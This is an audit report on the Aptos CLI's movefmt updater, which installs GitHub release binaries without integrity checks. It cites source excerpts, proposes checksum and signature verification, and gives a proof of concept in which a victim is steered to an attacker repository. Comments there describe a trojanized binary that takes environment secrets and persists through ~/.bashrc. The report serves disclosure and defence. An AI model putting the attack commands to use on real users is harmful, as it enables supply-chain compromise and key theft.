# Audit Report

## Title
Supply Chain Attack via Unverified Binary Download in Movefmt Update Mechanism

## Summary
The Aptos CLI's `movefmt` update mechanism downloads and executes binaries from the `movebit/movefmt` GitHub repository without any cryptographic verification (signature checks, checksum validation, or other integrity verification). An attacker who compromises the external repository can upload malicious release assets that will be automatically downloaded and executed by users, achieving Remote Code Execution on all systems running the Aptos CLI.

## Finding Description

The vulnerability exists in the binary update mechanism used by the Aptos CLI to download the `movefmt` formatter tool. The code path is as follows:

1. **Update Configuration**: The `FormatterUpdateTool` struct in `movefmt.rs` defaults to downloading from the `movebit/movefmt` repository: [1](#0-0) 

2. **Build Updater Without Verification**: The `build_updater()` function calls a helper that uses the `self_update` crate to configure the download: [2](#0-1) 

3. **No Integrity Checks**: The `build_updater()` helper function in `update_helper.rs` configures the download with only basic parameters (repo owner, repo name, version) but includes no signature verification, checksum validation, or any other integrity checks: [3](#0-2) 

4. **Binary Execution**: The downloaded binary is later executed with full user privileges when formatting Move code: [4](#0-3) [5](#0-4) 

**Attack Scenario:**
1. Attacker compromises the `movebit/movefmt` GitHub repository through credential theft, social engineering, or GitHub platform vulnerabilities
2. Attacker uploads a malicious binary as a release asset (e.g., version 1.4.5 or any target version)
3. Users run `aptos update movefmt` which downloads the malicious binary without verification
4. The malicious binary is installed in the user's system
5. When users later run `aptos move fmt`, the malicious binary executes with full user privileges
6. The malicious code can steal private keys, exfiltrate source code, inject backdoors into Move files, or establish persistent access

**Alternative Social Engineering Attack:**
An attacker could also use social engineering to trick users into specifying malicious repository parameters via CLI flags:
```bash
aptos update movefmt --repo-owner=attacker --repo-name=malicious-movefmt
```

## Impact Explanation

This vulnerability meets **Critical Severity** criteria per the Aptos bug bounty program for the following reasons:

1. **Remote Code Execution**: The malicious binary executes with full user privileges on any system running the Aptos CLI, including potentially validator operator workstations and developer machines.

2. **Wide Impact**: All users who run `aptos update movefmt` after the repository compromise would download and install the malicious binary. This could affect thousands of developers and potentially validator operators.

3. **Privilege Escalation**: The binary runs in the context of Move project development, giving it access to:
   - Private keys and wallet credentials
   - Move source code (can inject malicious logic)
   - Development environment and system files
   - Network access for data exfiltration

4. **Bypass of Code Review**: Release binaries bypass the normal code review process that would apply to source code changes in the Aptos Core repository. Users trust the update mechanism to deliver safe binaries.

5. **Stealth Persistence**: A sophisticated attacker could create a binary that appears to function normally as a formatter while performing malicious activities in the background.

This vulnerability could lead to **validator node compromise** if operators use the Aptos CLI on machines with access to validator keys, qualifying it as Critical under the "Remote Code Execution on validator node" category.

## Likelihood Explanation

**Likelihood: MEDIUM to HIGH**

While compromising a GitHub repository requires significant effort, several factors make this attack realistic:

1. **Precedent**: Supply chain attacks via compromised build tools and dependencies are increasingly common (SolarWinds, CodeCov, ua-parser-js npm package, etc.)

2. **Attack Surface**: The external repository (movebit/movefmt) may have:
   - Fewer security controls than the main Aptos Core repository
   - Multiple maintainers with varying security practices
   - Potential vulnerabilities in CI/CD pipelines
   - Risk of compromised maintainer credentials

3. **User Behavior**: Users routinely run update commands without scrutiny, trusting the toolchain

4. **Detection Difficulty**: A sophisticated attacker could create malicious binaries that pass basic testing and only activate under specific conditions

5. **Social Engineering Vector**: The `--repo-owner` and `--repo-name` flags make social engineering attacks trivial

## Recommendation

Implement cryptographic verification of downloaded binaries through one or more of the following mechanisms:

### Option 1: GPG Signature Verification (Recommended)
1. Sign all release binaries with a GPG key controlled by Aptos Foundation
2. Distribute the public key through secure channels (embedded in the CLI, published on official Aptos websites)
3. Verify signatures before installing binaries
4. Store checksums of approved releases in the Aptos Core repository itself

### Option 2: Checksum Pinning
1. Maintain a cryptographically signed manifest of expected checksums for all tool versions in the Aptos Core repository
2. Verify downloaded binaries against these checksums before installation
3. Update the manifest through the normal code review process

### Option 3: Reproducible Builds
1. Implement reproducible builds for movefmt and other external tools
2. Verify that downloaded binaries match reproducible build outputs

### Recommended Code Fix:

Add signature/checksum verification to the update flow:

```rust
// In update_helper.rs or a new verification module
pub fn verify_binary_integrity(
    binary_path: &Path,
    expected_checksum: &str,
    signature_path: Option<&Path>,
) -> Result<()> {
    // Verify SHA256 checksum
    let computed_hash = compute_sha256(binary_path)?;
    if computed_hash != expected_checksum {
        bail!("Binary checksum verification failed. Expected: {}, Got: {}", 
              expected_checksum, computed_hash);
    }
    
    // If signature provided, verify GPG signature
    if let Some(sig_path) = signature_path {
        verify_gpg_signature(binary_path, sig_path)?;
    }
    
    Ok(())
}
```

Additionally, remove or require explicit confirmation for the `--repo-owner` and `--repo-name` flags to prevent social engineering attacks.

## Proof of Concept

**Setup:**
1. Create a malicious GitHub repository with a trojanized movefmt binary
2. Build a binary that exfiltrates environment variables when executed

**Exploitation Steps:**

```bash
# Attacker publishes malicious movefmt at github.com/attacker/fake-movefmt
# The binary is designed to look like movefmt but exfiltrates data

# Victim runs (if using social engineering):
aptos update movefmt --repo-owner=attacker --repo-name=fake-movefmt --target-version=1.4.5

# Or if the real movebit/movefmt repository is compromised:
aptos update movefmt

# The malicious binary is downloaded and installed without verification

# Later, when formatting code:
cd /path/to/move/project
aptos move fmt

# The malicious binary executes, exfiltrating:
# - Environment variables (may contain keys, tokens)
# - Move source files (to inject malicious logic)
# - System information
# - Establishing persistence via modified ~/.bashrc or similar
```

**Demonstration that no verification occurs:**

Search the update code for any signature or checksum verification: [6](#0-5) 

No verification logic exists in the entire update flow. The binary is downloaded via the `self_update` crate and directly installed without any integrity checks.

## Notes

This vulnerability represents a **systemic supply chain security weakness** in the Aptos CLI tooling. The same vulnerability pattern exists for other external tools updated through similar mechanisms (Revela, potentially others). A comprehensive fix should address the entire update infrastructure, not just movefmt.

The repository parameter flags (`--repo-owner`, `--repo-name`) significantly lower the bar for exploitation through social engineering, as attackers don't need to compromise the actual external repositoryâ€”they just need to trick users into specifying malicious repositories.

### Citations

**File:** crates/aptos/src/update/movefmt.rs (L28-33)
```rust
    #[clap(long, default_value = "movebit")]
    repo_owner: String,

    /// The name of the repo to download the binary from.
    #[clap(long, default_value = "movefmt")]
    repo_name: String,
```

**File:** crates/aptos/src/update/movefmt.rs (L102-114)
```rust
    fn build_updater(&self, info: &UpdateRequiredInfo) -> Result<Box<dyn ReleaseUpdate>> {
        build_updater(
            info,
            self.install_dir.clone(),
            self.repo_owner.clone(),
            self.repo_name.clone(),
            FORMATTER_BINARY_NAME,
            "unknown-linux-gnu",
            "apple-darwin",
            "windows",
            self.prompt_options.assume_yes,
        )
    }
```

**File:** crates/aptos/src/update/update_helper.rs (L28-78)
```rust
pub fn build_updater(
    info: &UpdateRequiredInfo,
    install_dir: Option<PathBuf>,
    repo_owner: String,
    repo_name: String,
    binary_name: &str,
    linux_name: &str,
    mac_os_name: &str,
    windows_name: &str,
    assume_yes: bool,
) -> Result<Box<dyn ReleaseUpdate>> {
    // Determine the target we should download based on how the CLI itself was built.
    let arch_str = get_arch();
    let build_info = cli_build_information();
    let target = match build_info.get(BUILD_OS).context("Failed to determine build info of current CLI")?.as_str() {
        "linux-aarch64" | "linux-x86_64" => linux_name,
        "macos-aarch64" | "macos-x86_64" => mac_os_name,
        "windows-x86_64" => windows_name,
        wildcard => bail!("Self-updating is not supported on your OS ({}) right now, please download the binary manually", wildcard),
    };

    let target = format!("{}-{}", arch_str, target);

    let install_dir = match install_dir.clone() {
        Some(dir) => dir,
        None => {
            let dir = get_additional_binaries_dir();
            // Make the directory if it doesn't already exist.
            std::fs::create_dir_all(&dir)
                .with_context(|| format!("Failed to create directory: {:?}", dir))?;
            dir
        },
    };

    let current_version = match &info.current_version {
        Some(version) => version,
        None => "0.0.0",
    };

    Update::configure()
        .bin_install_dir(install_dir)
        .bin_name(binary_name)
        .repo_owner(&repo_owner)
        .repo_name(&repo_name)
        .current_version(current_version)
        .target_version_tag(&format!("v{}", info.target_version))
        .target(&target)
        .no_confirm(assume_yes)
        .build()
        .map_err(|e| anyhow!("Failed to build self-update configuration: {:#}", e))
}
```

**File:** crates/aptos/src/move_tool/fmt.rs (L81-89)
```rust
        let exe = get_movefmt_path()?;
        let package_opt = self.package_path;
        let config_path_opt = self.config_path;
        let files_opt = self.file_path;
        let config_map = self.config;
        let verbose_flag = self.verbose;
        let quiet_flag = self.quiet;
        let create_cmd = || {
            let mut cmd = Command::new(exe.as_path());
```

**File:** crates/aptos/src/move_tool/fmt.rs (L204-206)
```rust
            let mut cur_cmd = create_cmd();
            cur_cmd.arg(format!("--file-path={}", file.display()));
            let out = cur_cmd.output().map_err(to_cli_error)?;
```
